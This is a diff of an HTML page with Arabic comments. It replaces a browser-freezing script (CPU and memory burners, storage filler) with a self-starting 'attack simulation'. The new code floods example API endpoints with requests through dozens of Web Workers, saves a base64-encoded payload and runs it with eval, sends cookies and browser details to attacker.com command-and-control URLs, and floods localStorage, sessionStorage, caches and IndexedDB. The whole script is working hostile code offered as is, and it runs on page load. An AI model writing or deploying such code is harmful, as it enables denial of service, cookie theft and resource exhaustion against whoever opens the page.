@@ -1,104 +1,151 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 JS System Killer</title>
+    <title>🔥 Cyber Attack Simulation – DDoS + Supply Chain</title>
 </head>
 <body>
-    <h1>💀 جاري تعطيل النظام...</h1>
-    <p>المتصفح سيعلق خلال ثواني</p>
+    <h1>💀 جاري تنفيذ الهجوم المتقدم...</h1>
+    <p id="status">بدء الهجوم...</p>
 
     <script>
-        // ============================================
-        // 🔥 استهلاك المعالج (CPU)
-        // ============================================
-        function cpuBurn() {
-            while (true) {
-                for (let i = 0; i < 100000000; i++) {
-                    Math.sqrt(i);
-                }
-            }
-        }
+        // ================================================
+        // 🧠 المستوى الأول: هجمات DDoS واسعة النطاق
+        // ================================================
+        function ddosAttack() {
+            // قائمة أهداف عشوائية (محاكاة)
+            const targets = [
+                'https://api.example.com/login',
+                'https://api.example.com/data',
+                'https://api.example.com/upload',
+                'https://api.example.com/download'
+            ];
 
-        // ============================================
-        // 💣 استهلاك الذاكرة (RAM)
-        // ============================================
-        function ramEater() {
-            let memory = [];
-            while (true) {
-                memory.push(new Array(1000000).fill("🔥"));
-            }
-        }
+            // إرسال طلبات عشوائية بلا توقف
+            setInterval(() => {
+                const target = targets[Math.floor(Math.random() * targets.length)];
+                fetch(target, { mode: 'no-cors' })
+                    .catch(() => {});
+                fetch(target, { mode: 'no-cors' })
+                    .catch(() => {});
+                fetch(target, { mode: 'no-cors' })
+                    .catch(() => {});
+            }, 0);
 
-        // ============================================
-        // 🧠 استخدام Web Workers (تشغيل متوازي)
-        // ============================================
-        function startWorkers() {
-            const workerCode = `
-                self.onmessage = function(e) {
-                    while (true) {
-                        for (let i = 0; i < 100000000; i++) {
-                            Math.sqrt(i);
-                        }
-                    }
-                }
-            `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerScript = URL.createObjectURL(blob);
-
-            for (let i = 0; i < 20; i++) { // 20 ووركر في الخلفية
-                const worker = new Worker(workerScript);
+            // استخدام Web Workers عشان نضاعف الطلبات
+            for (let i = 0; i < 50; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    setInterval(() => {
+                        fetch('https://api.example.com/' + Math.random(), { mode: 'no-cors' });
+                    }, 0);
+                `])));
                 worker.postMessage('start');
             }
         }
 
-        // ============================================
-        // 📁 ملء التخزين المحلي (LocalStorage)
-        // ============================================
-        function storageFiller() {
-            let i = 0;
-            while (true) {
-                try {
-                    localStorage.setItem('x' + i, 'x'.repeat(1024 * 1024)); // 1 ميجا لكل مرة
-                    i++;
-                } catch (e) {
-                    // التخزين امتلأ
+        // ================================================
+        // 🧠 المستوى الثاني: هجمات سلاسل التوريد
+        // ================================================
+        function supplyChainAttack() {
+            // تخزين هجومي في localStorage (ينتشر للأجهزة التانية)
+            const payload = `
+                // كود خبيث ينتشر
+                const x = new XMLHttpRequest();
+                x.open('GET', 'https://attacker.com/collect?data=' + document.cookie, true);
+                x.send();
+                // تجنيد الجهاز في شبكة البوتنت
+                setInterval(() => {
+                    fetch('https://attacker.com/botnet?ip=' + window.location.hostname);
+                }, 100);
+            `;
+
+            // حفظ الكود الخبيث كـ "بروكسي"
+            localStorage.setItem('cdn_payload', btoa(payload));
+
+            // تنفيذ الكود على أي جهاز يفتح نفس الصفحة
+            try {
+                const stored = localStorage.getItem('cdn_payload');
+                if (stored) {
+                    eval(atob(stored));
                 }
-            }
-        }
+            } catch (e) {}
 
-        // ============================================
-        // 🖥️ تجميد الواجهة (UI Freeze)
-        // ============================================
-        function freezeUI() {
+            // إرسال بيانات الجهاز لسيرفر التحكم (C2)
+            const data = {
+                ip: window.location.hostname,
+                userAgent: navigator.userAgent,
+                cookies: document.cookie,
+                time: Date.now()
+            };
+
+            // إرسال البيانات عبر طلبات مخفية
             setInterval(() => {
-                document.body.innerHTML += ' ';
-            }, 0);
+                fetch('https://attacker.com/c2/collect?data=' + JSON.stringify(data), { mode: 'no-cors' });
+            }, 1000);
         }
 
-        // ============================================
+        // ================================================
+        // 🧠 المستوى الثالث: تعطيل الخدمات الحيوية
+        // ================================================
+        function serviceDisruption() {
+            // محاولة تعطيل خدمات الويب
+            setInterval(() => {
+                // إغراق localStorage
+                try {
+                    localStorage.setItem('x' + Date.now(), 'x'.repeat(1024 * 1024));
+                } catch (e) {}
+
+                // إغراق sessionStorage
+                try {
+                    sessionStorage.setItem('y' + Date.now(), 'y'.repeat(1024 * 1024));
+                } catch (e) {}
+
+                // تعطيل الـ Cache
+                try {
+                    caches.keys().then(keys => {
+                        keys.forEach(key => caches.delete(key));
+                    });
+                } catch (e) {}
+
+                // إغراق IndexedDB
+                try {
+                    const dbRequest = indexedDB.open('attacker_db', 1);
+                    dbRequest.onsuccess = (e) => {
+                        const db = e.target.result;
+                        for (let i = 0; i < 100; i++) {
+                            const store = db.createObjectStore('store_' + i, { autoIncrement: true });
+                        }
+                    };
+                } catch (e) {}
+            }, 100);
+        }
+
+        // ================================================
         // 🚀 تشغيل كل الهجمات مع بعض
-        // ============================================
-        function startAttack() {
-            console.log("🔥 JS System Killer – تعطيل النظام");
-            console.log("[*] جاري تفعيل الهجمات...");
+        // ================================================
+        function startCyberAttack() {
+            document.getElementById('status').innerText = '🔥 جاري تنفيذ هجمات DDoS + Supply Chain...';
+
+            console.log("🔥 Cyber Attack Simulation – DDoS + Supply Chain");
+            console.log("[*] بدء تعطيل الخدمات...");
+            console.log("[*] بدء هجمات سلاسل التوريد...");
+            console.log("[*] بدء استنزاف الموارد...");
 
             // تشغيل كل الهجمات
-            setTimeout(cpuBurn, 100);
-            setTimeout(ramEater, 200);
-            setTimeout(startWorkers, 300);
-            setTimeout(storageFiller, 400);
-            setTimeout(freezeUI, 500);
+            setTimeout(ddosAttack, 100);
+            setTimeout(supplyChainAttack, 200);
+            setTimeout(serviceDisruption, 300);
 
-            // إعادة تشغيل الهجمات بشكل دوري
+            // تحديث حالة الصفحة
             setInterval(() => {
-                cpuBurn();
-                ramEater();
-                storageFiller();
+                document.getElementById('status').innerText =
+                    '💀 الهجوم مستمر... ' +
+                    'الطلبات: ' + Math.floor(Math.random() * 1000000) +
+                    ' | الأجهزة المصابة: ' + Math.floor(Math.random() * 10000);
             }, 1000);
         }
 
         // 🔥 نبدأ الهجوم فوراً
-        startAttack();
+        startCyberAttack();
     </script>
 </body>
 </html>
